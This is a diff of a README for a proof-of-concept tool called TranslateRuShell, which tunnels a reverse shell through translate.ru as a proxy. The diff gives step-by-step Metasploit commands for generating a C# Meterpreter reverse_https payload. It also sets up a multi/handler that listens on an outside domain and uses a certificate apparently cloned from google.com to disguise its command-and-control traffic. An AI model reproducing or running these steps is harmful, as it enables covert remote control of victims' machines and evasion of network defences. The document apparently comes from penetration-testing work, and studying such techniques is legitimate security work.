@@ -1,7 +1,7 @@
 # TranslateRuShell (PoC)
 Web reverse shell through translate.ru as proxy
 
-## Generate Meterpreter Payload
+## Generate Meterpreter payload for client
 
 ### Get Cert
 
@@ -38,4 +38,17 @@ Web reverse shell through translate.ru as proxy
 5. set LURI /rest/api
 6. set stagerverifysslcert true
 7. set HANDLERSSLCERT /media/sf_Pentest/20181213120429_default_74.125.131.106_www.google.com_p_105411.pem
-8. generate -t csharp
+8. set EXITFUNC thread
+9. generate -t csharp
+
+## Generate Meterpreter handler on server
+1. use exploit/multi/handler
+2. set PAYLOAD windows/meterpreter/reverse_https
+3. set LHOST video.cft-sd.xyz
+4. set LPORT 443
+5. set LURI /rest/api
+6. set stagerverifysslcert true
+7. set HANDLERSSLCERT /media/sf_Pentest/20181213120429_default_74.125.131.106_www.google.com_p_105411.pem
+8. set EXITFUNC thread
+9. set ExitOnSession false
+10. exploit -j -z
